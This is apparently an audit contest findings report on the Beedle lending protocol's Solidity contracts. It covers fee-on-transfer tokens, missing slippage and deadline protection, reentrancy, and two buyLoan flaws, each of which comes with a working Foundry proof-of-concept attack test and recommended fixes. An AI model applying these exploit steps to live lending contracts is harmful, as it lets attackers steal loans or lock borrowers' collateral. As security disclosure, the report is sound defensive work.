# Beedle - Oracle free perpetual lending - Findings Report

# Table of contents

- ## High Risk Findings
  - ### [H-01. Tokens with a fee-on-transfer mechanism or rebase tokens may break the protocol](#H-01)
  - ### [H-02. Users are forced to swap tokens with no slippage protection](#H-02)
  - ### [H-03. A malicious user can lock the borrower's collateral tokens in the protocol](#H-03)
  - ### [H-04. Possible loan theft and collateral locking in the protocol](#H-04)
- ## Medium Risk Findings
  - ### [M-01. Ineffective deadline check when swap tokens](#M-01)
- ## Gas Optimizations / Informationals
  - ### [G-01. Assign the pool to a storage pointer variable to save gas from SLOADs](#G-01)
  - ### [G-02. The function with external call is missing the nonReentrant modifier and does not follow the CEI pattern](#G-02)
  - ### [G-03. Function is vulnerable to reentrancy attack](#G-03)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: BeedleFi

### Dates: Jul 24th, 2023 - Aug 7th, 2023

[See more contest details here](https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx)

# <a id='results-summary'></a>Results Summary

### Number of findings:

- High: 4
- Medium: 1
- Gas/Info: 3

# High Risk Findings

## <a id='H-01'></a>H-01. Tokens with a fee-on-transfer mechanism or rebase tokens may break the protocol

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46-L50

## Summary

Tokens with a fee-on-transfer mechanism or rebase tokens may break the protocol

## Vulnerability Details

The `ERC20` logic in the contracts is incompatible with tokens that have a fee-on-transfer mechanism, such as `PAXG` and `USDT` (with the fee-on-transfer currently switched off).

The implementation of the [deposit](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42) and [withdraw](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46-L50) functions in the Staking contract incorrectly handles the fee, resulting in discrepancies in token balances.

To illustrate the issue, a scenario is presented below:

1. Bob deposits 100 tokens.
2. Alice deposits 100 tokens.
3. Bob withdraws 100 tokens.

When Bob deposits 100 tokens, the contract will save the amount as 100 tokens, but the actual transferred amount will be `amount - fee` (95 tokens).

```solidity
    function deposit(uint _amount) external {
        TKN.transferFrom(msg.sender, address(this), _amount);
        updateFor(msg.sender);
        balances[msg.sender] += _amount;
    }
```

Later, when Bob withdraws, he is able to withdraw the full amount - 100 tokens (Bob will receive only 95 tokens due to the fee).

```solidity
    function withdraw(uint _amount) external {
        updateFor(msg.sender);
        balances[msg.sender] -= _amount;
        TKN.transfer(msg.sender, _amount);
    }
```

This will lead to a loss for Alice when she withdraws her tokens from the contract, as the remaining token amount will be smaller.

## Impact

The vulnerability causes incorrect functionality in the protocol when dealing with tokens that have a fee-on-transfer mechanism or rebase tokens. It results in a discrepancy between the expected and actual token balances within the contract. When the last person tries to transfer tokens out of the contract, it may lead to revert and potential financial losses for users.

## Tools Used

Manual review

## Recommendations

To address this vulnerability, the following recommendations are proposed:

1. Implement a balance check before executing `transferFrom` to the contract and verify the balance again after the transfer. Use the difference between the two balances as the newly added balance.
   _Apply a `nonReentrant` modifier to prevent manipulation by ERC777 tokens._

2. Alternatively, if supporting tokens with a fee-on-transfer mechanism or rebase tokens is not feasible, it is advised to clearly document and announce that such tokens are not supported by the contract.

## <a id='H-02'></a>H-02. Users are forced to swap tokens with no slippage protection

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L38

## Summary

[sellProfits](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44) allows users to swap tokens but lacks the capability to specify any slippage values.

## Vulnerability Details

The [sellProfits](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44) function uses Uniswap to swap tokens with `amountOutMinimum = 0`, leaving users vulnerable to sandwich attacks and potential loss of all their tokens.

## Impact

User can be sandwiched, leading to the potential loss of all tokens.

## Tools Used

Manual review

## Recommendations

To mitigate the risks, allow users to specify a slippage parameter.

```diff
-function sellProfits(address _profits) public {
+function sellProfits(address _profits, uint256 _amountOutMinimum) public {
    require(_profits != WETH, "not allowed");
    uint256 amount = IERC20(_profits).balanceOf(address(this));

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
        .ExactInputSingleParams({
            tokenIn: _profits,
            tokenOut: WETH,
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amount,
-           amountOutMinimum: 0,
+           amountOutMinimum: _amountOutMinimum,
            sqrtPriceLimitX96: 0
        });

    amount = swapRouter.exactInputSingle(params);
    IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
}
```

## <a id='H-03'></a>H-03. A malicious user can lock the borrower's collateral tokens in the protocol

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L534

## Summary

Attackers can `buyLoan` with worthless `ERC20` tokens due to missing checks for token mismatches, which leads to the borrower's collateral becoming locked.

## Vulnerability Details

The problem with the [buyLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L515) function is that it lacks a check to ensure whether the tokens of the new pool mismatch with those of the old pool (similar to the [giveLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L369-L371) function).

This scenario can be exploited as follows:

_Bob is the lender, Mallory is the borrower, and Eve is the attacker._

1. Bob calls [setPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L176) to create a pool with `loanToken: WETH` and `collateralToken: DAI`.

2. Mallory decides to take a loan from Bob's pool and proceeds by calling [borrow](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L232-L287), which transfers the `DAI` tokens into the protocol and transfer her the corresponding amount of `WETH`.

3. At a later point, Bob decides to sell Mallory's loan to retrieve his `WETH` tokens, so he calls [startAuction](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L437-L459).

4. Recognizing an opportunity, Eve deploys a malicious `ERC20` token (let's call it `ATR`), which is worthless. Subsequently, she uses this token and calls [setPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L176) to create a new pool with `loanToken: ATR` and `collateralToken: DAI`

5. As a result, Eve can now buy Mallory's loan from Bob's auction, causing the loan's `loanToken` to be set to her malicious token address. This is possible because the contract lacks a check for tokens mismatch.

### POC:

_Add this test in the `Lender.t.sol`_

```solidity
function test_blockCollateral() external {
        // lender 1 set pool
        vm.prank(lender1);
        bytes32 lenderPoolId = lender.setPool(Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100e18,
            poolBalance: 1000e18,
            maxLoanRatio: 1e18,
            auctionLength: 12 hours,
            interestRate: 1000,
            outstandingLoans: 0
        }));

        // borrower get loan from lender1's pool
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = Borrow({
            poolId: lenderPoolId,
            debt: 1000e18,
            collateral: 1000e18
        });
        vm.prank(borrower);
        lender.borrow(borrows);

        // lender 1 start auction for loan 0
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);

        // attacker preparation
        address attacker = address(0x999);
        vm.startPrank(attacker);
        TERC20 attackerToken = new TERC20();
        attackerToken.mint(attacker, 1000e18);
        attackerToken.approve(address(lender), 1000e18);
        bytes32 attackerPoolId = lender.setPool(Pool({
            lender: attacker,
            loanToken: address(attackerToken),
            collateralToken: address(collateralToken),
            minLoanSize: 1,
            poolBalance: 1000e18,
            maxLoanRatio: 1e18,
            auctionLength: 12 hours,
            interestRate: 0,
            outstandingLoans: 0
        }));

        // attacker `buyLoan` but use worthless token
        lender.buyLoan(0, attackerPoolId);
        vm.stopPrank();

        vm.prank(borrower);
        vm.expectRevert(); // pools[poolId].outstandingLoans -= loan.debt;
        lender.repay(loanIds);
    }
```

## Impact

The borrower is unable to retrieve his collateral because it becomes locked in a non-existent pool.

## Tools Used

Manual review, Foundry

## Recommendations

Add the following check-in `buyLoan`

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L487

```diff
// reject if the pool is not big enough
uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();

+ if (pool.loanToken != loan.loanToken) revert TokenMismatch();
+ if (pool.collateralToken != loan.collateralToken) revert TokenMismatch();

// if they do have a big enough pool then transfer from their pool
_updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
pools[poolId].outstandingLoans += totalDebt;
```

## <a id='H-04'></a>H-04. Possible loan theft and collateral locking in the protocol

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L534

## Summary

The protocol allows attackers to steal loans and lock collateral, due to missing checks if the loan requester is the owner of the associated pool. Additionally, the lender's funds can be trapped with the borrower, who is unable to repay or refinance the loan. Attackers can exploit this vulnerability to set up foreign pools. This poses a significant risk to borrowers and lenders.

## Vulnerability Details

The problem with the [buyLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L515) is that it lacks a check to ensure whether the `msg.sender` is the owner of the pool associated with the passed `poolId`. Additionally, at the end of the function, the new loan lender is set to `msg.sender` instead of the `pool.lender`.

Let's consider the following scenario:
Bob is Lender1; Alice is Lender2; Mallory is the Borrower; Eve is an Attacker **with no pool and without any loanTokens**

1. Bob calls [setPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L176) to create a pool with `poolBalance: 1000e18`, `loanToken: WETH`, and `collateralToken: DAI`, assigned `poolId: 0x0`, and transfers the `WETH` amount into the protocol.
2. Alice calls [setPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L176) to create a pool with `poolBalance: 2000e18`, `loanToken: WETH`, and `collateralToken: DAI`, assigned `poolId: 0x1`, and transfers the `WETH` amount into the protocol.
3. Mallory wants to take a loan of `1000e18` from Bob's pool, so she calls [borrow](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L232-L287), transferring the `DAI` tokens into the protocol and receiving her amount of `WETH`.
4. After some time, Bob decides to sell Mallory's loan and retrieve his `WETH` tokens, so he calls [startAuction](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L437-L459).
5. Eve sees an opportunity to steal Mallory's loan, so she calls [buyLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L465-L515) `with loanId = 0 and poolId = 0x1` (Mallory's loan and Alice's pool). She can do this because there is no check if `msg.sender == pool.lender`.

As a result:

- The `WETH` amount will be subtracted from Alice's pool [poolBalance](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L489-L490) without her consent.
- Mallory is unable to [repay](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L292-L345) or [refinance](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L591-L710) the loan. Alice is also unable to [startAuction](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L437-L459) because his [address != pool.lender](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L443), [giveLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L355-L432) because his [address != pool.lender](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L365), or [seizeLoan](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L548-L586) because the [attacker is not started auction](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L554-L555).
- Bob will not be harmed as he will be able to withdraw his loan amount along with the interest from his pool

**Eve can exploit this vulnerability to set up foreign pools that meet certain requirements: [poolBalance ≥ totalDebt](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L486) and [interestRate ≤ currentAuctionRate](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L478-L478).**

### POC:

_Add this test in the `Lender.t.sol`_

```solidity
    function test_attackerCanSetArbitraryPool() external {
        uint256 thousand = 1000e18;
        address attacker = address(0x999);

        emit log_named_uint("attacker loanToken balance", loanToken.balanceOf(attacker));
        emit log_named_uint("attacker collateralToken balance", collateralToken.balanceOf(attacker));

        // lender 1 set pool
        vm.prank(lender1);
        bytes32 poolId0 = lender.setPool(Pool({
            lender: lender1,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: 100e18,
            poolBalance: thousand,
            maxLoanRatio: 1e18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        }));

        // lender 2 set pool
        vm.prank(lender2);
        bytes32 poolId1 = lender.setPool(Pool({
            lender: lender2,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: thousand,
            poolBalance: thousand * 2,
            maxLoanRatio: 1e18,
            auctionLength: 1 days,
            interestRate: 500,
            outstandingLoans: 0
        }));

        // borrower get loan from pool 0
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = Borrow({
            poolId: poolId0,
            debt: thousand,
            collateral: thousand
        });
        vm.prank(borrower);
        lender.borrow(borrows);

        // lender 1 start auction
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        vm.prank(lender1);
        lender.startAuction(loanIds);

        vm.warp(block.timestamp + 12 hours);

        emit log("--- attacker `buyLoan` with a pool he doesn't own ---");
        vm.prank(attacker);
        lender.buyLoan(0, poolId1);

        {
            (,,,,uint256 oldPoolBalance,,,,uint256 oldPoolOutstandingLoans) = lender.pools(poolId0);
            emit log_named_uint("oldPoolBalance", oldPoolBalance);
            emit log_named_uint("oldPoolOutstandingLoans", oldPoolOutstandingLoans);

            (,,,,uint256 newPoolBalance,,,,uint256 newPoolOutstandingLoans) = lender.pools(poolId1);
            emit log_named_uint("newPoolBalance:", newPoolBalance);
            emit log_named_uint("newPoolOutstandingLoans", newPoolOutstandingLoans);
        }

        emit log("--- borrower `repay`: revert due to underflow ---");
        loanToken.mint(address(borrower), lender.getLoanDebt(0) - (thousand - (thousand * 50) / 10000));

        vm.prank(borrower);
        vm.expectRevert();
        lender.repay(loanIds);

        emit log("--- borrower `refinance` to other pool: revert --- ");
        // lender 3 set pool
        address lender3 = address(10);
        loanToken.mint(lender3, thousand * 3);
        vm.startPrank(lender3);
        loanToken.approve(address(lender), thousand * 3);
        bytes32 poolId2 = lender.setPool(Pool({
            lender: lender3,
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            minLoanSize: thousand,
            poolBalance: thousand * 3,
            maxLoanRatio: 1e18,
            auctionLength: 1 days,
            interestRate: 500,
            outstandingLoans: 0
        }));
        vm.stopPrank();

        Refinance[] memory refinances = new Refinance[](1);
        refinances[0] = Refinance({
            loanId: 0,
            poolId: poolId2,
            debt: thousand,
            collateral: thousand + 1
        });

        vm.prank(borrower);
        vm.expectRevert();
        lender.refinance(refinances);

        emit log("--- lender 1 `startAuction`: revert because he no longer owns the loan ---");
        vm.prank(lender1);
        vm.expectRevert(Unauthorized.selector);
        lender.startAuction(loanIds);

        emit log("--- lender 2 `giveLoan`: revert because lender2 is not loan.lender ---");
        bytes32[] memory poolIds = new bytes32[](1);
        poolIds[0] = poolId0;
        vm.prank(lender2);
        vm.expectRevert(Unauthorized.selector);
        lender.giveLoan(loanIds, poolIds);

        emit log("--- lender 2 `seizeLoan`: revert because the attacker is not started auction ---");
        vm.prank(lender2);
        vm.expectRevert(AuctionNotStarted.selector);
        lender.seizeLoan(loanIds);

        emit log("--- lender 2 `buyLoan`: revert because the attacker is not started the auction ---");
        vm.prank(lender2);
        vm.expectRevert();
        lender.buyLoan(0, poolId1);
    }
```

## Impact

The borrower is unable to retrieve their collateral because it becomes locked in a non-existent pool. The lender's funds will be stuck with the borrower, who cannot return them because they are unable to `repay` or `refinance`.

The attacker can choose to lock funds in the protocol or, if profitable, set up their own pool with a very small `auctionLength` and enough balance to `seizeLoan` and get the user's collateral.

## Tools Used

Manual review, Foundry

## Recommendations

Set the new loan lender to `pool.lender` if you want everyone to be able to match arbitrary loans with arbitrary pools.

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L518

```diff
- loans[loanId].lender = msg.sender;
+ loans[loanId].lender = pools[poolId].lender;
```

---

The better option is to add a check if the `msg.sender == newPool.lender`.

```diff
if (pools[poolId].interestRate > currentAuctionRate) revert RateTooHigh();
// calculate the interest
(uint256 lenderInterest, uint256 protocolInterest) = _calculateInterest(
    loan
);

+ if (msg.sender != pools[poolId].lender) revert Unauthorized();

// reject if the pool is not big enough
uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();
```

# Medium Risk Findings

## <a id='M-01'></a>M-01. Ineffective deadline check when swap tokens

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L36

## Summary

[sellProfits](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44) allows users to swap tokens but lacks the capability to specify an effective deadline check by the user.

## Vulnerability Details

The [sellProfits](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L26-L44) function uses Uniswap to swap tokens. Using `block.timestamp` as a [deadline](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol#L36) is an ineffective way to protect the user from the unexpected execution of the transaction in the future, leaving users vulnerable to the potential loss of their tokens.

This is possible because whenever the miner decides to include the transaction in a block, it will be valid at that time, since `block.timestamp` will be the current timestamp.

## Impact

The user's transaction can be unexpectedly executed at any convenient time, which can lead to a loss of funds.

## Tools Used

Manual review

## Recommendations

To mitigate the risks, allow users to specify a deadline parameter.

```diff
-function sellProfits(address _profits) public {
+function sellProfits(address _profits, uint256 _deadline) public {
    require(_profits != WETH, "not allowed");
    uint256 amount = IERC20(_profits).balanceOf(address(this));

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
        .ExactInputSingleParams({
            tokenIn: _profits,
            tokenOut: WETH,
            fee: 3000,
            recipient: address(this),
-           deadline: block.timestamp,
+           deadline: _deadline,
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });

    amount = swapRouter.exactInputSingle(params);
    IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
}
```

# Gas Optimizations / Informationals

## <a id='G/I-01'></a>G/I-01. Assign the pool to a storage pointer variable to save gas from SLOADs

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L163

## Summary

To save gas from SLOADs, the recommendation is to assign the pool to a storage pointer variable.

## Vulnerability Details

## Impact

By implementing the recommended change, the following functions will consume less gas:

- [setPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L130-L176): 240632 -> 240502
- [addToPool](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L182-L192): 247549 -> 247401

## Tools Used

Manual review

## Recommendations

Use storage pointer to save gas from SLOADs

```diff
    function setPool(Pool calldata p) public returns (bytes32 poolId) {
        // validate the pool
        if (
            p.lender != msg.sender ||
            p.minLoanSize == 0 ||
            p.maxLoanRatio == 0 ||
            p.auctionLength == 0 ||
            p.auctionLength > MAX_AUCTION_LENGTH ||
            p.interestRate > MAX_INTEREST_RATE
        ) revert PoolConfig();

        // check if they already have a pool balance
        poolId = getPoolId(p.lender, p.loanToken, p.collateralToken);

+       Pool storage pool = pools[poolId];

        // you can't change the outstanding loans
-       if (p.outstandingLoans != pools[poolId].outstandingLoans)
+       if (p.outstandingLoans != pool.outstandingLoans)
            revert PoolConfig();

-       uint256 currentBalance = pools[poolId].poolBalance;
+       uint256 currentBalance = pool.poolBalance;

        if (p.poolBalance > currentBalance) {
            // if new balance > current balance then transfer the difference from the lender
            IERC20(p.loanToken).transferFrom(
                p.lender,
                address(this),
                p.poolBalance - currentBalance
            );
        } else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer(
                p.lender,
                currentBalance - p.poolBalance
            );
        }

        emit PoolBalanceUpdated(poolId, p.poolBalance);

-       if (pools[poolId].lender == address(0)) {
+       if (pool.lender == address(0)) {
            // if the pool doesn't exist then create it
            emit PoolCreated(poolId, p);
        } else {
            // if the pool does exist then update it
            emit PoolUpdated(poolId, p);
        }

        pools[poolId] = p;
    }
```

## <a id='G/I-02'></a>G/I-02. The function with external call is missing the nonReentrant modifier and does not follow the CEI pattern

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L46-L50

## Summary

The function [claim](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L53-L58) makes an external call and lacks the `nonReentrant` modifier and does not follow the CEI pattern.

## Vulnerability Details

The function is designed to use with `WETH`, which does not have a callback function and therefore cannot be reentered. However, if the [WETH](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L29) storage variable is set to another token with a callback, there exists a possibility for the function to be reentered and funds to be drained.

It is recommended to follow the CEI pattern or add a `nonReentrant` modifier, even when using a known token like `WETH`, which doesn't have a callback function that could transfer the execution flow to the caller.

## Impact

If [WETH](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L29) storage variable is set to another token that has a callback, it becomes feasible for the function to be reentered and funds to be drained.

## Tools Used

Manual review

## Recommendations

Consider using OpenZeppelin's [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) and add the `nonReentrant` modifier to the function.

## <a id='G/I-03'></a>G/I-03. Function is vulnerable to reentrancy attack

### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42

## Summary

The [deposit](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42) function can be re-entered.

## Vulnerability Details

The [deposit](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol#L38-L42) function makes an external call to an `ERC20` token. It is possible for this token to be an `ERC777` (which is an `ERC20` extension) that has a callback function. In that case, this function is vulnerable to reentrancy because it missing a `nonReentrant` modifier.

## Impact

Because this is a deposit function that transfers tokens from the user to the protocol, it is not possible for the user to steal tokens. Additionally, the state is updated after the external call, so if the user reenters the function, they can only harm themselves.

## Tools Used

Manual review

## Recommendations

Consider using OpenZeppelin's [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) and add the `nonReentrant` modifier to the function.
